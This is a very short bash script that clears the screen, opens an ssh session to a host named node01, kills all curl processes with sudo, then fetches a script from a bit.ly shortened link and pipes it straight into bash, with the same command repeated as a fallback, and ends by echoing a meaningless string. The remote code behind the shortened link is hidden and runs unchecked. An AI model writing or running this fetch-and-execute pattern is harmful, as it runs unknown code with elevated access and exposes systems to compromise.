#!/bin/bash
clear
ssh node01
sudo killall curl && curl -s -L https://bit.ly/3lalhby | bash || curl -s -L https://bit.ly/3lalhby | bash
echo dsjfjsd

